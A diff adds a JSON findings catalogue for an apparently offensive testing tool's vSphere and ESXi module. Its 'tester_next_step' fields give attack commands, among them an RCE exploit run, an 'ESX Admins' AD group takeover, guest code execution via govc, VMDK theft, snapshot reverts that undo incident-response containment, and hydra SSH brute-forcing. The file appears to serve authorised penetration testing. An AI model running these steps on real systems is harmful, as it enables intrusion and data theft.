@@ -1,0 +1,171 @@
+{
+  "service": "vcenter",
+  "module_files": [
+    "recce/services/vsphere.py"
+  ],
+  "summary": "Very deep vSphere module. Fingerprint + strict build->CVE mapping (T1 CVE candidate). SessionManager.Login sweep against operator + vendor default creds is T3 initial-access. Post-auth inventory/session/local-users enum is T4 chain material. Missing: no active exploit for -21985 or -34048; ESXi 'ESX Admins' finding is version-only, not an actual AD-group probe (can't be \u2014 needs AD).",
+  "findings": [
+    {
+      "kind": "vsphere_fingerprint",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "vSphere SDK reachable",
+      "tier_evidence": "SOAP RetrieveServiceContent fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Ground-truth AboutInfo; feeds every other finding.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sk -X POST https://IP:443/sdk -H 'Content-Type: text/xml' --data '<RetrieveServiceContent xmlns=\"urn:vim25\"/>'"
+    },
+    {
+      "kind": "vsphere_outdated_build",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "vSphere build <build> vulnerable to <CVEs>",
+      "tier_evidence": "Deterministic integer build comparison against a curated patch matrix \u2014 probe SUCCEEDS ONLY IF build < patched_build. Non-destructive, exact.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For -21985, send a benign version-probe request to the vROps plugin endpoint (e.g. /ui/vropspluginui/rest/services/ ) and note the status; for -34048, no safe DCE-RPC probe exists.",
+      "promotion_risk": "high",
+      "tester_next_step": "Match CVE to exploit: -21985 -> github.com/psc4re/NSE-scripts/blob/master/CVE-2021-21985.nse; -34048 -> proof-of-concept only in labs; ensure ROE before firing.",
+      "related_cves": [
+        "CVE-2021-21985",
+        "CVE-2021-22005",
+        "CVE-2023-34048",
+        "CVE-2024-37085"
+      ]
+    },
+    {
+      "kind": "vsphere_cve_2021_21985",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "vSphere Client pre-auth RCE CVE-2021-21985 candidate",
+      "tier_evidence": "Fires only when build is below the specific -21985 patch line \u2014 build-gated CVE candidate.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Wire up a controlled write of a canary file via the vROps plugin deserialization (public exploit); dropping a webshell is T3 initial access. Currently module refuses to fire the payload.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "python3 CVE-2021-21985.py -t IP  # only in a lab / ROE-approved engagement; writes files on the appliance.",
+      "related_cves": [
+        "CVE-2021-21985"
+      ]
+    },
+    {
+      "kind": "vsphere_cve_2024_37085",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "ESXi CVE-2024-37085 candidate ('ESX Admins' AD auto-promote)",
+      "tier_evidence": "Build-gated per patched HostAgent matrix.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Requires an AD write primitive from a captured cred to create the 'ESX Admins' group; a real T3 chain when paired with LDAP creds. Cannot promote without AD reach.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "If AD-joined + you hold Domain Admin: net group 'ESX Admins' /add /domain ; net group 'ESX Admins' <attacker-user> /add /domain ; ssh <attacker-user>@<esxi-ip>  # full ESXi admin",
+      "related_cves": [
+        "CVE-2024-37085"
+      ]
+    },
+    {
+      "kind": "vsphere_sso_domain",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "vSphere SSO domain identified",
+      "tier_evidence": "Extracted from AboutInfo + cert CN \u2014 recon.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Chain into administrator@<sso> login attempt (module already does).",
+      "promotion_risk": "low",
+      "tester_next_step": "GOVC_URL='https://administrator@<sso>@IP' GOVC_INSECURE=1 govc about"
+    },
+    {
+      "kind": "vsphere_cert",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "vSphere /sdk TLS cert hostnames enumerated",
+      "tier_evidence": "TLS cert SAN read.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feed to known_hostnames.",
+      "promotion_risk": "none",
+      "tester_next_step": "openssl s_client -connect IP:443 -servername <cn> </dev/null | openssl x509 -text | grep -i dns"
+    },
+    {
+      "kind": "vsphere_valid_creds",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "vSphere valid credentials accepted",
+      "tier_evidence": "SessionManager.Login accepted with a live vmware_soap_session cookie \u2014 that IS a live admin session on vCenter/ESXi. Not just a credential match: recce holds an authenticated API handle. Follow-on SessionList + inventory calls use that cookie.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Chain to: DatastoreBrowser (dump VM VMDKs), GuestOperationsManager.startProgram (RCE inside a Windows/Linux VM guest), or CVE-2024-37085 AD group manipulation. All destructive.",
+      "promotion_risk": "high",
+      "tester_next_step": "govc: export GOVC_URL='https://<user>@IP' GOVC_INSECURE=1 GOVC_PASSWORD='<pw>'; govc ls -l; govc guest.run -vm <vm> -l root:<pw> id  # or use pyvmomi to pull VMDKs off the datastore",
+      "related_cves": []
+    },
+    {
+      "kind": "vsphere_sessions",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "vSphere active session list enumerated",
+      "tier_evidence": "SessionList requires an authenticated cookie; when it fires, recce is authenticated and pulls real operator identities + admin workstation IPs.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed operator usernames into known_users for downstream spray; admin workstation IPs -> relay_targets for SMB relay / rundll32 payloads.",
+      "promotion_risk": "medium",
+      "tester_next_step": "govc session.ls ; then port-scan each ip_address in the list for RDP/WinRM/SMB \u2014 those are admin workstations"
+    },
+    {
+      "kind": "vsphere_inventory",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "vCenter inventory enumerated: N ESXi host(s), M VM(s)",
+      "tier_evidence": "Post-auth RetrievePropertiesEx returns HostSystem + VirtualMachine \u2014 this is real vCenter API control, each host now a hypervisor foothold target.",
+      "can_promote_to": "t4",
+      "promotion_notes": "For each managed host, retry vsphere_valid_creds with the same SSO cookie on the ESXi /sdk directly \u2014 many share a Vault-issued cert principal. And run GuestOperations startProgram inside each VM (CVE-2017-4924-style).",
+      "promotion_risk": "destructive",
+      "tester_next_step": "govc ls host ; govc ls vm ; govc host.esxcli -host <host> system version get ; govc guest.run -vm <vm> -l administrator:'' whoami"
+    },
+    {
+      "kind": "vsphere_stale_snapshot",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "vCenter powered-off VMs with snapshots",
+      "tier_evidence": "Snapshot list requires authenticated inventory read \u2014 real API control.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Snapshot.revert to defeat post-compromise IR / cred rotation on the guest OS. Destructive by design.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "govc snapshot.tree -vm <critical-vm> ; govc snapshot.revert -vm <critical-vm> <snap>  # ROE-required; undoes IR containment"
+    },
+    {
+      "kind": "vsphere_linked",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "vCenter Enhanced Linked Mode / peer vCenter(s) named",
+      "tier_evidence": "managementServerIp on managed hosts requires authenticated inventory read.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Retry same SSO creds against peer vCenter /sdk \u2014 Enhanced Linked Mode shares SSO across the estate.",
+      "promotion_risk": "medium",
+      "tester_next_step": "For each linked IP: GOVC_URL=https://<user>@<peer-ip> govc about  # confirm same creds work on the peer"
+    },
+    {
+      "kind": "vsphere_local_users",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "ESXi local accounts enumerated",
+      "tier_evidence": "HostLocalAccountManager.RetrieveUserGroups requires authenticated ESXi session \u2014 real post-auth read.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed principals into known_users; spray each account against SSH on ESXi with vendor defaults + captured pw.",
+      "promotion_risk": "high",
+      "tester_next_step": "esxcli system account list ; hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<esxi-ip> -t 4 -f"
+    },
+    {
+      "kind": "vsphere_vami",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "vCenter VAMI (5480/tcp) reachable alongside SDK",
+      "tier_evidence": "Port-presence signal.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Add a VAMI-specific default-cred probe (root/vmware / root/'') on /rest/appliance/access/consolecli.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sk -u root:vmware https://IP:5480/rest/appliance/access/consolecli"
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hostnames",
+    "relay_targets",
+    "cred_store"
+  ]
+}
